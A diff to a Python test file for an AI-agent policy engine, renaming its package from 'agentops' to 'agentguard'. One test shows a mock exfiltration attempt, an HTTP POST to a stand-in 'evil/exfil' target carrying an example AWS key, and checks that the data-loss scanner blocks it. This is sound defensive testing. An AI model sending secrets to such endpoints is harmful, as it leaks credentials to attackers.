@@ -2,9 +2,9 @@
 
 import httpx
 
-from agentops.models import Decision, Effect, Policy
-from agentops.policy.engine import ActionRequest, PolicyEngine
-from agentops.policy.external import ExternalPolicyEngine
+from agentguard.models import Decision, Effect, Policy
+from agentguard.policy.engine import ActionRequest, PolicyEngine
+from agentguard.policy.external import ExternalPolicyEngine
 
 
 def _policy(pid, effect, resource, actions, **kw):
@@ -143,8 +143,8 @@ def test_external_engine_fail_open_when_configured():
 
 
 def test_external_engine_still_blocks_dlp_exfiltration():
-    from agentops.dlp.scanner import scan_payload
-    # Even if OPA would allow, a secret on an egress action is blocked by AgentOps.
+    from agentguard.dlp.scanner import scan_payload
+    # Even if OPA would allow, a secret on an egress action is blocked by AgentGuard.
     eng = _engine("opa", lambda req: httpx.Response(200, json={"result": True}))
     dlp = scan_payload({"k": "AKIAIOSFODNN7EXAMPLE"})
     d = eng.evaluate(ActionRequest("http.post", "http:evil/exfil", payload={"k": "x"}), dlp=dlp)
